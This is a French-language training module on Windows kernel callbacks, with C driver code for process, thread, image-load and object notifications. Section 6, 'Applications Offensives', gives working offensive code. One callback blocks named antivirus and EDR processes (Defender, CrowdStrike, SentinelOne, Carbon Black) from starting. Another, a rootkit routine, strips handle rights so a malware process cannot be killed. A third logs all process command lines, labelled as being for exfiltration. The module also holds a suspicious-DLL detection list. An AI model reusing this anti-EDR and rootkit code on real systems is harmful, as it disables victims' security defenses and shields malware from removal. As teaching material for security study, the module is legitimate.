# Module W74 : Kernel Callbacks

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre le systeme de callbacks kernel Windows
- Enregistrer des callbacks pour process, thread, image load
- Intercepter la creation/terminaison de processus
- Monitorer le chargement de DLLs
- Bloquer des operations depuis le kernel

## Prerequis

- Module W71 (Driver Basics)
- Module W72 (Kernel Memory)
- Module W73 (IOCTL Communication)

## 1. Introduction aux Callbacks

### 1.1 Qu'est-ce qu'un Callback?

Un callback kernel est une fonction que Windows appelle automatiquement
quand un evenement se produit (creation processus, chargement DLL, etc.)

```
CALLBACK FLOW:

Event Occurs                Kernel              Your Driver
┌─────────────┐           ┌─────────┐         ┌──────────────┐
│  Process    │──────────>│ Windows │────────>│ Your Callback│
│  Created    │  Trigger  │  Kernel │  Calls  │   Function   │
└─────────────┘           └─────────┘         └──────────────┘
                                                      │
                                                      ▼
                                             ┌──────────────────┐
                                             │ - Log Event      │
                                             │ - Block Action   │
                                             │ - Modify Behavior│
                                             └──────────────────┘
```

### 1.2 Types de Callbacks

```
CALLBACK TYPES DISPONIBLES:

1. Process Notify Callbacks
   - PsSetCreateProcessNotifyRoutine
   - PsSetCreateProcessNotifyRoutineEx
   - PsSetCreateProcessNotifyRoutineEx2

2. Thread Notify Callbacks
   - PsSetCreateThreadNotifyRoutine
   - PsSetCreateThreadNotifyRoutineEx

3. Image Load Notify Callbacks
   - PsSetLoadImageNotifyRoutine
   - PsSetLoadImageNotifyRoutineEx

4. Object Callbacks
   - ObRegisterCallbacks (Process/Thread handles)

5. Registry Callbacks
   - CmRegisterCallback / CmRegisterCallbackEx

6. File System Minifilter
   - FltRegisterFilter (voir module W77)
```

## 2. Process Notify Callbacks

### 2.1 Basique - PsSetCreateProcessNotifyRoutine

```c
#include <ntddk.h>

// Callback appelee a chaque creation/terminaison de processus
VOID ProcessNotifyCallback(
    HANDLE ParentId,
    HANDLE ProcessId,
    BOOLEAN Create
) {
    if (Create) {
        DbgPrint("[+] Process Created: PID %llu, Parent PID %llu\n",
                 (ULONG64)ProcessId, (ULONG64)ParentId);
    } else {
        DbgPrint("[-] Process Terminated: PID %llu\n", (ULONG64)ProcessId);
    }
}

// Enregistrer le callback
NTSTATUS RegisterProcessCallback() {
    NTSTATUS status;

    status = PsSetCreateProcessNotifyRoutine(
        ProcessNotifyCallback,
        FALSE  // FALSE = enregistrer, TRUE = deregistrer
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] PsSetCreateProcessNotifyRoutine failed: 0x%X\n", status);
        return status;
    }

    DbgPrint("[+] Process callback registered\n");
    return STATUS_SUCCESS;
}

// Deregistrer le callback
VOID UnregisterProcessCallback() {
    PsSetCreateProcessNotifyRoutine(
        ProcessNotifyCallback,
        TRUE  // TRUE = deregistrer
    );

    DbgPrint("[*] Process callback unregistered\n");
}
```

### 2.2 Avance - PsSetCreateProcessNotifyRoutineEx

```c
// Callback avec informations etendues
VOID ProcessNotifyCallbackEx(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo
) {
    UNREFERENCED_PARAMETER(Process);

    if (CreateInfo != NULL) {
        // Creation de processus
        DbgPrint("[+] Process Created:\n");
        DbgPrint("    PID: %llu\n", (ULONG64)ProcessId);
        DbgPrint("    Parent PID: %llu\n",
                 (ULONG64)CreateInfo->ParentProcessId);

        if (CreateInfo->ImageFileName) {
            DbgPrint("    Image: %wZ\n", CreateInfo->ImageFileName);
        }

        if (CreateInfo->CommandLine) {
            DbgPrint("    CommandLine: %wZ\n", CreateInfo->CommandLine);
        }

        // BLOQUER la creation (Red Team!)
        // CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;

    } else {
        // Terminaison
        DbgPrint("[-] Process Terminated: PID %llu\n", (ULONG64)ProcessId);
    }
}

// Enregistrer
NTSTATUS RegisterProcessCallbackEx() {
    NTSTATUS status;

    status = PsSetCreateProcessNotifyRoutineEx(
        ProcessNotifyCallbackEx,
        FALSE
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] PsSetCreateProcessNotifyRoutineEx failed: 0x%X\n", status);
        return status;
    }

    DbgPrint("[+] Extended process callback registered\n");
    return STATUS_SUCCESS;
}
```

### 2.3 Exemple : Bloquer un Processus

```c
// Bloquer l'execution de cmd.exe
VOID BlockCmdCallback(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo
) {
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(ProcessId);

    if (CreateInfo != NULL && CreateInfo->ImageFileName != NULL) {
        UNICODE_STRING cmdExe;
        RtlInitUnicodeString(&cmdExe, L"cmd.exe");

        // Verifier si c'est cmd.exe
        if (wcsstr(CreateInfo->ImageFileName->Buffer, cmdExe.Buffer) != NULL) {
            DbgPrint("[!] Blocked cmd.exe execution\n");

            // BLOQUER!
            CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
        }
    }
}
```

## 3. Thread Notify Callbacks

### 3.1 Thread Creation/Termination

```c
// Callback pour threads
VOID ThreadNotifyCallback(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create
) {
    if (Create) {
        DbgPrint("[+] Thread Created: TID %llu in PID %llu\n",
                 (ULONG64)ThreadId, (ULONG64)ProcessId);
    } else {
        DbgPrint("[-] Thread Terminated: TID %llu\n", (ULONG64)ThreadId);
    }
}

// Enregistrer
NTSTATUS RegisterThreadCallback() {
    NTSTATUS status;

    status = PsSetCreateThreadNotifyRoutine(ThreadNotifyCallback);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] PsSetCreateThreadNotifyRoutine failed: 0x%X\n", status);
        return status;
    }

    DbgPrint("[+] Thread callback registered\n");
    return STATUS_SUCCESS;
}

// Deregistrer
VOID UnregisterThreadCallback() {
    PsRemoveCreateThreadNotifyRoutine(ThreadNotifyCallback);
    DbgPrint("[*] Thread callback unregistered\n");
}
```

## 4. Image Load Notify Callbacks

### 4.1 DLL/Driver Loading

```c
// Callback pour chargement d'images (EXE, DLL, SYS)
VOID ImageLoadCallback(
    PUNICODE_STRING FullImageName,
    HANDLE ProcessId,
    PIMAGE_INFO ImageInfo
) {
    if (FullImageName != NULL) {
        DbgPrint("[*] Image Loaded:\n");
        DbgPrint("    Path: %wZ\n", FullImageName);
        DbgPrint("    PID: %llu\n", (ULONG64)ProcessId);
        DbgPrint("    Base: %p\n", ImageInfo->ImageBase);
        DbgPrint("    Size: 0x%lX\n", (ULONG)ImageInfo->ImageSize);
        DbgPrint("    System Image: %s\n",
                 ImageInfo->SystemModeImage ? "Yes" : "No");
    }
}

// Enregistrer
NTSTATUS RegisterImageLoadCallback() {
    NTSTATUS status;

    status = PsSetLoadImageNotifyRoutine(ImageLoadCallback);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] PsSetLoadImageNotifyRoutine failed: 0x%X\n", status);
        return status;
    }

    DbgPrint("[+] Image load callback registered\n");
    return STATUS_SUCCESS;
}

// Deregistrer
VOID UnregisterImageLoadCallback() {
    PsRemoveLoadImageNotifyRoutine(ImageLoadCallback);
    DbgPrint("[*] Image load callback unregistered\n");
}
```

### 4.2 Detecter DLL Suspectes

```c
// Logger le chargement de DLLs malveillantes
VOID DetectMaliciousDllCallback(
    PUNICODE_STRING FullImageName,
    HANDLE ProcessId,
    PIMAGE_INFO ImageInfo
) {
    UNREFERENCED_PARAMETER(ImageInfo);

    if (FullImageName != NULL && ProcessId != 0) {
        // Liste de DLLs suspectes
        WCHAR* suspiciousDlls[] = {
            L"inject.dll",
            L"hook.dll",
            L"keylog.dll",
            NULL
        };

        for (int i = 0; suspiciousDlls[i] != NULL; i++) {
            if (wcsstr(FullImageName->Buffer, suspiciousDlls[i]) != NULL) {
                DbgPrint("[!] ALERT: Suspicious DLL loaded!\n");
                DbgPrint("    DLL: %wZ\n", FullImageName);
                DbgPrint("    PID: %llu\n", (ULONG64)ProcessId);
                // On pourrait tuer le processus ici
            }
        }
    }
}
```

## 5. Object Callbacks (ObRegisterCallbacks)

### 5.1 Protection de Processus

```c
// Structure pour pre/post operation
OB_PREOP_CALLBACK_STATUS PreOperationCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OperationInformation
) {
    UNREFERENCED_PARAMETER(RegistrationContext);

    // Verifier si c'est un handle vers un processus
    if (OperationInformation->ObjectType == *PsProcessType) {
        PEPROCESS targetProcess = (PEPROCESS)OperationInformation->Object;
        HANDLE targetPid = PsGetProcessId(targetProcess);

        DbgPrint("[*] Process handle operation:\n");
        DbgPrint("    Target PID: %llu\n", (ULONG64)targetPid);
        DbgPrint("    Operation: %s\n",
                 OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE
                     ? "CREATE" : "DUPLICATE");

        // PID a proteger (ex: 1234)
        if ((ULONG64)targetPid == 1234) {
            DbgPrint("[!] Protecting PID 1234 - Removing privileges\n");

            // Supprimer les droits dangereux
            if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE) {
                OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=
                    ~PROCESS_TERMINATE;
                OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=
                    ~PROCESS_VM_WRITE;
                OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=
                    ~PROCESS_VM_OPERATION;
            }
        }
    }

    return OB_PREOP_SUCCESS;
}

// Enregistrer callback d'objets
NTSTATUS RegisterObjectCallback(PVOID* RegistrationHandle) {
    NTSTATUS status;
    OB_OPERATION_REGISTRATION operationRegistration[2];
    OB_CALLBACK_REGISTRATION callbackRegistration;

    // Process callbacks
    operationRegistration[0].ObjectType = PsProcessType;
    operationRegistration[0].Operations = OB_OPERATION_HANDLE_CREATE |
                                          OB_OPERATION_HANDLE_DUPLICATE;
    operationRegistration[0].PreOperation = PreOperationCallback;
    operationRegistration[0].PostOperation = NULL;

    // Thread callbacks
    operationRegistration[1].ObjectType = PsThreadType;
    operationRegistration[1].Operations = OB_OPERATION_HANDLE_CREATE |
                                          OB_OPERATION_HANDLE_DUPLICATE;
    operationRegistration[1].PreOperation = PreOperationCallback;
    operationRegistration[1].PostOperation = NULL;

    // Configuration
    UNICODE_STRING altitude;
    RtlInitUnicodeString(&altitude, L"321000");  // Altitude unique

    callbackRegistration.Version = OB_FLT_REGISTRATION_VERSION;
    callbackRegistration.OperationRegistrationCount = 2;
    callbackRegistration.Altitude = altitude;
    callbackRegistration.RegistrationContext = NULL;
    callbackRegistration.OperationRegistration = operationRegistration;

    // Enregistrer
    status = ObRegisterCallbacks(&callbackRegistration, RegistrationHandle);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] ObRegisterCallbacks failed: 0x%X\n", status);
        return status;
    }

    DbgPrint("[+] Object callbacks registered\n");
    return STATUS_SUCCESS;
}

// Deregistrer
VOID UnregisterObjectCallback(PVOID RegistrationHandle) {
    if (RegistrationHandle) {
        ObUnRegisterCallbacks(RegistrationHandle);
        DbgPrint("[*] Object callbacks unregistered\n");
    }
}
```

## 6. Applications Offensives

### 6.1 Anti-AV : Bloquer Processus EDR

```c
// Bloquer les processus AV/EDR
VOID AntiAvCallback(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo
) {
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(ProcessId);

    if (CreateInfo != NULL && CreateInfo->ImageFileName != NULL) {
        // Liste d'EDR/AV a bloquer
        WCHAR* blockedProcesses[] = {
            L"MsMpEng.exe",      // Windows Defender
            L"CrowdStrike.exe",
            L"SentinelAgent.exe",
            L"cb.exe",           // Carbon Black
            NULL
        };

        for (int i = 0; blockedProcesses[i] != NULL; i++) {
            if (wcsstr(CreateInfo->ImageFileName->Buffer, blockedProcesses[i])) {
                DbgPrint("[!] Blocking AV/EDR: %wZ\n", CreateInfo->ImageFileName);
                CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
                return;
            }
        }
    }
}
```

### 6.2 Rootkit : Proteger Processus Malveillant

```c
// Proteger notre malware de toute terminaison
PVOID g_CallbackHandle = NULL;

OB_PREOP_CALLBACK_STATUS ProtectMalwareCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OperationInformation
) {
    UNREFERENCED_PARAMETER(RegistrationContext);

    if (OperationInformation->ObjectType == *PsProcessType) {
        PEPROCESS targetProcess = (PEPROCESS)OperationInformation->Object;
        HANDLE targetPid = PsGetProcessId(targetProcess);

        // PID de notre malware (passe via IOCTL)
        if ((ULONG64)targetPid == MALWARE_PID) {
            DbgPrint("[*] Protecting malware process\n");

            // Retirer TOUS les droits dangereux
            if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE) {
                OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = 0;
            } else {
                OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess = 0;
            }
        }
    }

    return OB_PREOP_SUCCESS;
}
```

### 6.3 Logger/Exfiltration

```c
// Logger tous les processus pour exfiltration
typedef struct _PROCESS_LOG_ENTRY {
    LARGE_INTEGER Timestamp;
    ULONG ProcessId;
    ULONG ParentProcessId;
    WCHAR ImageName[256];
    WCHAR CommandLine[512];
} PROCESS_LOG_ENTRY;

#define MAX_LOG_ENTRIES 1000
PROCESS_LOG_ENTRY g_ProcessLog[MAX_LOG_ENTRIES];
ULONG g_LogIndex = 0;
KSPIN_LOCK g_LogLock;

VOID LogProcessCallback(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo
) {
    UNREFERENCED_PARAMETER(Process);

    if (CreateInfo != NULL) {
        KIRQL oldIrql;
        KeAcquireSpinLock(&g_LogLock, &oldIrql);

        ULONG index = g_LogIndex % MAX_LOG_ENTRIES;
        PPROCESS_LOG_ENTRY entry = &g_ProcessLog[index];

        KeQuerySystemTime(&entry->Timestamp);
        entry->ProcessId = (ULONG)(ULONG_PTR)ProcessId;
        entry->ParentProcessId = (ULONG)(ULONG_PTR)CreateInfo->ParentProcessId;

        if (CreateInfo->ImageFileName) {
            wcsncpy(entry->ImageName, CreateInfo->ImageFileName->Buffer, 255);
        }

        if (CreateInfo->CommandLine) {
            wcsncpy(entry->CommandLine, CreateInfo->CommandLine->Buffer, 511);
        }

        g_LogIndex++;

        KeReleaseSpinLock(&g_LogLock, oldIrql);
    }
}
```

## 7. Driver Complet avec Callbacks

```c
#include <ntddk.h>

PVOID g_ObjectCallbackHandle = NULL;

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);

    // Deregistrer tous les callbacks
    PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallbackEx, TRUE);
    PsRemoveCreateThreadNotifyRoutine(ThreadNotifyCallback);
    PsRemoveLoadImageNotifyRoutine(ImageLoadCallback);

    if (g_ObjectCallbackHandle) {
        ObUnRegisterCallbacks(g_ObjectCallbackHandle);
    }

    DbgPrint("[+] All callbacks unregistered\n");
}

NTSTATUS DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
) {
    NTSTATUS status;
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrint("[*] Callbacks Driver Loading\n");

    DriverObject->DriverUnload = DriverUnload;

    // Enregistrer callbacks
    status = PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallbackEx, FALSE);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] Process callback failed: 0x%X\n", status);
        return status;
    }

    status = PsSetCreateThreadNotifyRoutine(ThreadNotifyCallback);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] Thread callback failed: 0x%X\n", status);
        PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallbackEx, TRUE);
        return status;
    }

    status = PsSetLoadImageNotifyRoutine(ImageLoadCallback);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] Image callback failed: 0x%X\n", status);
        PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallbackEx, TRUE);
        PsRemoveCreateThreadNotifyRoutine(ThreadNotifyCallback);
        return status;
    }

    status = RegisterObjectCallback(&g_ObjectCallbackHandle);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] Object callback failed: 0x%X\n", status);
        // Cleanup...
    }

    DbgPrint("[+] All callbacks registered successfully\n");
    return STATUS_SUCCESS;
}
```

## 8. Checklist Kernel Callbacks

```
[ ] Comprendre les types de callbacks disponibles
[ ] Enregistrer/deregistrer process callbacks
[ ] Bloquer la creation de processus
[ ] Monitorer threads et image loads
[ ] Utiliser ObRegisterCallbacks pour protection
[ ] Gerer les callbacks de maniere thread-safe
[ ] Cleanup propre au unload
[ ] Logger les evenements
[ ] Applications offensives (anti-AV, protection)
```

## 9. Exercices

Voir [exercice.md](exercice.md)

## Ressources Complementaires

- MSDN: Process and Thread Callbacks
- MSDN: ObRegisterCallbacks
- Windows Internals: Kernel Notification Facilities
- GitHub: Callback samples

---

**Navigation**
- [Module precedent](../W73_ioctl_communication/)
- [Module suivant](../W75_dkom/)
